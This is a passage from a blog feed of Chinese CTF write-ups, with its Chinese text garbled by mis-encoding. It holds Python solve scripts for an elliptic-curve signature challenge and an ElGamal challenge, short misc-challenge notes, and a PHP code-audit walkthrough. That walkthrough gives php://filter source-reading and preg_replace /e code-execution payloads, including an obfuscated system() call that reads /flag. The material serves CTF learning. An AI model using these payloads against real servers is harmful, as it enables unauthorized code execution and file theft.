class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INF = (<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="number">311315114987715623444276142623839583360207853110657101019745009424926710590583360123029204556690633449715530612380512577293882572730509350735778781050933</span></span><br><span class="line"></span><br><span class="line">mod = <span class="number">8948962207650232551656602815159153422162609644098354511344597187200057010413552439917934304191956942765446530386427345937963894309923928536070534607816947</span></span><br><span class="line">a = <span class="number">6294860557973063227666421306476379324074715770622746227136910445450301914281276098027990968407983962691151853678563877834221834027439718238065725844264138</span></span><br><span class="line">b = <span class="number">3245789008328967059274849584342077916531909009637501918328323668736179176583263496463525128488282611559800773506973771797764811498834995234341530862286627</span></span><br><span class="line">n = <span class="number">8948962207650232551656602815159153422162609644098354511344597187200057010413418528378981730643524959857451398370029280583094215613882043973354392115544169</span></span><br><span class="line">G = (<span class="number">5139617820728399941653175323358137352238277428061991823713659546881441331696699723004749024403291797641521696406798421624364096550661311227399430098134141</span>,</span><br><span class="line">     <span class="number">1798860115416690485862271986832828064808333512613833729548071279524320966991708554765227095605106785724406691559310536469721469398449016850588110200884962</span>,</span><br><span class="line">     <span class="number">5042518522433577951395875294780962682755843408950010956510838422057522452845550974098236475624683438351211176927595173916071040272153903968536756498306512</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Double</span>(<span class="params">p</span>):</span></span><br><span class="line">    x, y, z = p</span><br><span class="line">    <span class="keyword">if</span> z == <span class="number">0</span> <span class="keyword">or</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> INF</span><br><span class="line">    ysqr = y * y % mod</span><br><span class="line">    zsqr = z * z % mod</span><br><span class="line">    s = <span class="number">4</span> * x * ysqr % mod</span><br><span class="line">    m = (<span class="number">3</span> * x * x + a * zsqr * zsqr) % mod</span><br><span class="line">    x2 = (m * m - <span class="number">2</span> * s) % mod</span><br><span class="line">    y2 = (m * (s - x2) - <span class="number">8</span> * ysqr * ysqr) % mod</span><br><span class="line">    z2 = <span class="number">2</span> * y * z % mod</span><br><span class="line">    <span class="keyword">return</span> x2, y2, z2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">p, q</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p[<span class="number">2</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> q</span><br><span class="line">    <span class="keyword">if</span> q[<span class="number">2</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    x1, y1, z1 = p</span><br><span class="line">    x2, y2, z2 = q</span><br><span class="line">    z1sqr = z1 * z1 % mod</span><br><span class="line">    z2sqr = z2 * z2 % mod</span><br><span class="line">    u1 = x1 * z2sqr % mod</span><br><span class="line">    u2 = x2 * z1sqr % mod</span><br><span class="line">    s1 = y1 * z2 * z2sqr % mod</span><br><span class="line">    s2 = y2 * z1 * z1sqr % mod</span><br><span class="line">    <span class="keyword">if</span> u1 == u2:</span><br><span class="line">        <span class="keyword">if</span> s1 != s2:</span><br><span class="line">            <span class="keyword">return</span> INF</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Double(p)</span><br><span class="line">    h = u2 - u1 % mod</span><br><span class="line">    hsqr = h * h % mod</span><br><span class="line">    hcube = hsqr * h % mod</span><br><span class="line">    r = s2 - s1 % mod</span><br><span class="line">    t = u1 * hsqr % mod</span><br><span class="line">    x3 = (r * r - hcube - <span class="number">2</span> * t) % mod</span><br><span class="line">    y3 = (r * (t - x3) - s1 * hcube) % mod</span><br><span class="line">    z3 = h * z1 * z2 % mod</span><br><span class="line">    <span class="keyword">return</span> x3, y3, z3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Multiply</span>(<span class="params">p, x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p == INF:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    res = INF</span><br><span class="line">    <span class="keyword">while</span> x:</span><br><span class="line">        x, r = <span class="built_in">divmod</span>(x, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> r:</span><br><span class="line">            res = Add(res, p)</span><br><span class="line">        p = Double(p)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Transform</span>(<span class="params">m, l</span>):</span></span><br><span class="line">    z = m</span><br><span class="line">    shift = l - n.bit_length()</span><br><span class="line">    <span class="keyword">if</span> shift &gt; <span class="number">0</span>:</span><br><span class="line">        z &gt;&gt;= shift</span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RNG</span>(<span class="params">nbits, a, b</span>):</span></span><br><span class="line">    nbytes = nbits // <span class="number">8</span></span><br><span class="line">    B = os.urandom(nbytes)</span><br><span class="line">    <span class="keyword">return</span> a * <span class="built_in">sum</span>([B[i] * b ** i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(B))]) % <span class="number">2</span>**nbits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sign</span>(<span class="params">msg, d</span>):</span></span><br><span class="line">    h = hashlib.sha512(msg)</span><br><span class="line">    z = Transform(<span class="built_in">int</span>.from_bytes(h.digest(), <span class="string">&#x27;big&#x27;</span>), h.digest_size*<span class="number">8</span>)</span><br><span class="line">    print(<span class="string">&#x27;d = &#x27;</span>, d)</span><br><span class="line">    print(<span class="string">&#x27;z = &#x27;</span>, z)</span><br><span class="line">    k = RNG(n.bit_length(), <span class="number">16843009</span>, <span class="number">4294967296</span>)</span><br><span class="line">    print(<span class="string">&#x27;k = &#x27;</span>, k)</span><br><span class="line">    x1, y1, z1 = Multiply(G, k)</span><br><span class="line">    r = (x1 * <span class="built_in">pow</span>(z1, -<span class="number">2</span>, mod) % mod) % n</span><br><span class="line">    s = <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * d) % n</span><br><span class="line">    print(<span class="string">&#x27;r = &#x27;</span>, r)</span><br><span class="line">    print(<span class="string">&#x27;s = &#x27;</span>, s)</span><br><span class="line">    print(<span class="string">&#x27;left = &#x27;</span>, <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) % n)</span><br><span class="line">    print(<span class="string">&#x27;right = &#x27;</span>, (z + r * d) % n)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">int</span>(s) == <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * d) % n</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Verify</span>(<span class="params">msg, Q, r, s</span>):</span></span><br><span class="line">    h = hashlib.sha512(msg)</span><br><span class="line">    z = Transform(<span class="built_in">int</span>.from_bytes(h.digest(), <span class="string">&#x27;big&#x27;</span>), h.digest_size*<span class="number">8</span>)</span><br><span class="line">    u1 = z*<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) % n</span><br><span class="line">    u2 = r*<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) % n</span><br><span class="line">    x1, y1, z1 = Add(Multiply(G, u1), Multiply(Q, u2))</span><br><span class="line">    <span class="keyword">return</span> r == (x1 * <span class="built_in">pow</span>(z1, -<span class="number">2</span>, mod) % mod) % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">plaintext, x</span>):</span></span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(x).encode()).digest()</span><br><span class="line">    aes = algorithms.AES(key)</span><br><span class="line">    encryptor = Cipher(aes, modes.ECB(), default_backend()).encryptor()</span><br><span class="line">    padder = padding.PKCS7(aes.block_size).padder()</span><br><span class="line">    padded_data = padder.update(plaintext) + padder.finalize()</span><br><span class="line">    ciphertext = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">ciphertext, x</span>):</span></span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(x).encode()).digest()</span><br><span class="line">    aes = algorithms.AES(key)</span><br><span class="line">    decryptor = Cipher(aes, modes.ECB(), default_backend()).decryptor()</span><br><span class="line">    unpadder = padding.PKCS7(aes.block_size).unpadder()</span><br><span class="line">    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()</span><br><span class="line">    plaintext = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line">_, _, ca = (<span class="number">8832295267397231051293216564016639537146222596144354850230682204978731311879255662259663270183445827348338041752369314181111940713714991119349376636404112</span>, <span class="number">8683784208731634307361157916911868656279723101808163939313971801256736484458199874570532609285522391139002296248059424750941962344918156540408403221858292</span>, <span class="number">105398535464409171419472607677747462033030589690350997911381059472020486557672504778060748058626707326992258591478040500759349352824508941100030623708235493999018571171774658661651532338275358740821547158517615704187173346885098836066743736788259192831313414309775979590033581301910426314601982482556670097620</span>)</span><br><span class="line"></span><br><span class="line">ka = [</span><br><span class="line">    <span class="number">0x8a6e81a10c229af504772b51c502638820811034faa62b8dafa019210347918419b71d0638c89b59026b7611edc6a14b2c1c1fb1092a352adfffb7e114f4f385</span>,</span><br><span class="line">    <span class="number">0x3f837315a1fb46097f5eb680697901d75758b859846d37cad33d3f464efb84ace1e85fc60f4e445a031b5ca0e4965e0b081bd4a6e8efea1d3ba07aad51a70cd</span></span><br><span class="line">]</span><br><span class="line">ca = ca.to_bytes(byteorder=<span class="string">&#x27;big&#x27;</span>,length=(ca.bit_length() + <span class="number">7</span>) // <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> ka:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        recv_msg = Decrypt(ca, k)</span><br><span class="line">        print(recv_msg)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a>ElGamal</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;./output.txt&#x27;</span>).read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">g, h, A, B, p, q = <span class="built_in">eval</span>(data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">c1, c2 = <span class="built_in">eval</span>(data[<span class="number">1</span>])</span><br><span class="line">c1_, c2_ = <span class="built_in">eval</span>(data[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">tmp = gmpy2.powmod(c2, A, p) * gmpy2.powmod(h, B, p) * gmpy2.invert(c2_, p)</span><br><span class="line">tmp = tmp % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;t=&#x27;</span>, tmp</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;A=&#x27;</span>, A</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;p=&#x27;</span>, p</span><br><span class="line">gg, x, y = gmpy2.gcdext(A - <span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span> gg</span><br><span class="line"></span><br><span class="line">m = gmpy2.powmod(tmp, x, p)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(m)[<span class="number">2</span>:].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç­¾åˆ°-2"><a href="#ç­¾åˆ°-2" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>base32è§£ç </p><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>zstegç›´æ¥å‡º</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/QQ%E5%9B%BE%E7%89%8720211007231453.png"></p><h3 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h3><p>ç™¾åº¦è¯†å›¾ï¼Œç¦å°”æ‘©æ–¯ï¼Œæœç´¢å‘ç°è·³èˆçš„å°äºº</p><p>å‘ç°æç¤ºä¿¡æ¯<a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p><p>å¯†ç æ–‡ä»¶è™½ç„¶ç©ºç™½ä½†æ˜¯å ç”¨ç©ºé—´å¾ˆå¤§ï¼Œç”¨ä¸Šé¢çš„å·¥å…·</p><p>æœ€å16è¿›åˆ¶è½¬å­—ç¬¦ä¸²å¾—åˆ°flag</p><h3 id="ç¤¾å·¥"><a href="#ç¤¾å·¥" class="headerlink" title="ç¤¾å·¥"></a>ç¤¾å·¥</h3><p>æ‰«ææœºç¥¨ä¸Šçš„æ¡å½¢ç å³å¯ï¼Œå±äºpdf417ï¼Œm1åé¢å°±æ˜¯å§“å</p><p><a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;éœ‡æƒŠï¼å¹³å¹³æ— å¥‡çš„webæ‰‹ï¼Œç«Ÿç„¶æŠŠcrypto akäº†ï¼Œé¡ºå¸¦åšäº†2ä¸ªreå’Œå‡ ä¸ªmiscã€‚ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;æ ¡èµ›æ„Ÿè§‰éš¾åº¦ä¸€èˆ¬ï¼Œå°±æ˜¯ç»™å…¥é—¨çš„åšäº†ï¼Œæš‘å‡å­¦çš„å¥½å¤šéƒ½ç”¨ä¸Šäº†ï¼Œæ„Ÿè§‰ä¸é”™ã€‚ä¸è¿‡æŒç»­æ—¶é—´å¤ªé•¿äº†ï¼Œç›´æ¥7å¤©ï¼Œè€Œä¸”å›½åº†é‚£å‡ å¤©è´¼å¿™ï¼Œéƒ¨é—¨ã€å·¥ä½œå®¤ã€æ–°ç”ŸÂ·Â·Â·Â·Â·Â·æ—¶é—´ä¸æ˜¯å¾ˆåˆç†ï¼Œæœ€åå‡ å¤©ç›´æ¥æ‘†çƒ‚äº†ï¼Œä¸€ä¸ªé¢˜ä¹Ÿæ²¡åšã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ctfå­¦ä¹ " scheme="http://haorical.xyz/categories/ctf%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>20210928</title>
    <link href="http://haorical.xyz/posts/c1b9d3fa/"/>
    <id>http://haorical.xyz/posts/c1b9d3fa/</id>
    <published>2021-09-28T16:15:39.000Z</published>
    <updated>2021-09-28T17:38:22.757Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><blockquote><p>ä»£ç å®¡è®¡ æ–‡ä»¶åŒ…å«</p></blockquote><p>å…ˆåˆ©ç”¨dataæ•°æ®æµï¼Œæˆ–è€…php://inputç»•è¿‡ç¬¬ä¸€ä¸ªï¼Œå†åˆ©ç”¨php://filterè¯»å–next.phpæºç </p><p>è¿™ä¸ªæœ‰ä¸ªå‘ï¼Œè€å¿˜ï¼Œinclude phpæ–‡ä»¶æ—¶ï¼Œè¦ç”¨</p><pre><code>file=php://filter/read=convert.base64-encode/resource=next.php</code></pre><p>å°½å¿ƒbase64ç¼–ç ï¼Œå¦åˆ™ä¼ ä¸è¿‡æ¥ã€‚</p><p>ä»£ç å®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹preg_replaceç”¨æ³•</p><pre><code>preg_replace( mixed $pattern, mixed $replacement, mixed $subject[, int $limit = -1[, int &amp;$count]] ) : mixed</code></pre><p>æœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œä»¥replacementè¿›è¡Œæ›¿æ¢ã€‚ </p><p>è¿™é‡Œåˆçœ‹äº†çœ‹phpè¯­æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> å¾ªç¯ç”¨äºéå†æ•°ç»„ã€‚</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    è¦æ‰§è¡Œä»£ç ;</span><br><span class="line">&#125;</span><br><span class="line">æ¯è¿›è¡Œä¸€æ¬¡å¾ªç¯ï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„å€¼å°±ä¼šè¢«èµ‹å€¼ç»™ <span class="variable">$value</span> å˜é‡ï¼ˆæ•°ç»„æŒ‡é’ˆä¼šé€ä¸€åœ°ç§»åŠ¨ï¼‰ï¼Œåœ¨è¿›è¡Œä¸‹ä¸€æ¬¡å¾ªç¯æ—¶ï¼Œæ‚¨å°†çœ‹åˆ°æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå€¼ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    è¦æ‰§è¡Œä»£ç ;</span><br><span class="line">&#125;</span><br><span class="line">æ¯ä¸€æ¬¡å¾ªç¯ï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„é”®ä¸å€¼å°±éƒ½ä¼šè¢«èµ‹å€¼ç»™ <span class="variable">$key</span> å’Œ <span class="variable">$value</span> å˜é‡ï¼ˆæ•°å­—æŒ‡é’ˆä¼šé€ä¸€åœ°ç§»åŠ¨ï¼‰ï¼Œåœ¨è¿›è¡Œä¸‹ä¸€æ¬¡å¾ªç¯æ—¶ï¼Œä½ å°†çœ‹åˆ°æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªé”®ä¸å€¼ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">&quot;Google&quot;</span>, <span class="number">2</span>=&gt;<span class="string">&quot;Runoob&quot;</span>, <span class="number">3</span>=&gt;<span class="string">&quot;Taobao&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;key  ä¸º &quot;</span> . <span class="variable">$key</span> . <span class="string">&quot;ï¼Œå¯¹åº”çš„ value ä¸º &quot;</span>. <span class="variable">$value</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">key  ä¸º <span class="number">1</span>ï¼Œå¯¹åº”çš„ value ä¸º Google</span><br><span class="line">key  ä¸º <span class="number">2</span>ï¼Œå¯¹åº”çš„ value ä¸º Runoob</span><br><span class="line">key  ä¸º <span class="number">3</span>ï¼Œå¯¹åº”çš„ value ä¸º Taobao</span><br></pre></td></tr></table></figure><p>å°±å·®ä¸å¤šäº†ï¼Œç›´æ¥æ„é€ payload</p><pre><code>?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></pre><p>è¿™é‡Œè¿˜åˆ©ç”¨äº†preg_replace /e æ¨¡å¼ä¸‹çš„ä»£ç æ‰§è¡Œé—®é¢˜ï¼Œ\S*ä¼šåŒ¹é…åˆ°getFlagè¿™ä¸ªå‡½æ•°</p><pre><code>preg_replace(&#39;/(\S*)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$&#123;getFlag()&#125;);</code></pre><p>preg_replace å‡½æ•°åœ¨åŒ¹é…åˆ°ç¬¦å·æ­£åˆ™çš„å­—ç¬¦ä¸²æ—¶ï¼Œä¼šå°†ç¬¬äºŒä¸ªå‚æ•°å½“åšä»£ç æ¥æ‰§è¡Œï¼Œå³ â€˜strtolower(â€œ\1â€)â€™ </p><p>è¿™é‡Œçš„\1å°±ç›¸å½“äºæ˜¯ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹ï¼Œç”±äº\S<em>ç”±</em>ï¼ˆï¼‰<em>åŒ…è£¹è¿™é‡Œæœ‰ä¸ª<strong>åå‘å¼•ç”¨</strong>ï¼Œ\S</em>åŒ¹é…çš„ç¬¬ä¸€ä¸ªè¡¨è¾¾å¼å°±æ˜¯${getFlag()}ï¼Œå¯¹å…¶è¿›è¡Œä»£ç æ‰§è¡Œï¼Œè¿›è€Œåˆ©ç”¨è¿™ä¸ªå‡½æ•°çš„eval</p><p>è¿˜å¯ä»¥ç›´æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´å‘½ä»¤æ‰§è¡Œè€Œä¸ç”¨eval</p><pre><code>?\S*=$&#123;system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103))&#125;</code></pre><p>æ‹¼æ¥çš„</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤&quot;&gt;&lt;a href=&quot;#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤&quot;&gt;&lt;/a&gt;[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</summary>
      
    
    
    
    <category term="ctfæ¯æ—¥ä¸€é¢˜" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="http://haorical.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="æ–‡ä»¶åŒ…å«" scheme="http://haorical.xyz/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
</feed>
